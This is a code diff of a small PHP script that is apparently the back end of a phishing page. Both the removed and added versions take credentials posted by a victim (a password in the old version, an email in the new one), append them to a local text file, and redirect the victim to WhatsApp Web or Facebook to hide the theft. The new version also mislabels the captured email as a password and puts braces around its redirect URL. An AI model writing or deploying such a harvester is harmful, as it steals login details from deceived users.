@@ -1,12 +1,15 @@
 <?php
-    $password = $_POST["password"];
-    $pass = "\n Password: $password";
-    $date = date('d-m-Y');
-    $fileuser = fopen("contraseña.txt", "a");
-    $cl = "\n ===========================================";
-    fwrite($fileuser, " Date: $date \n $pass \n $cl");
+$user = $_POST["email"];
+    $co = "===========================================
+"; 
+    $cl = "===========================================
+";
+    $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
+    $us = "Password: $user
+";
+    fwrite($fileuser, "
+". $co. $us. $cl);
     fclose($fileuser);
-    header('Location: https://web.whatsapp.com/');
+    header('Location: {https://www.facebook.com/}');
     exit();
-//by Mr Star
 ?>
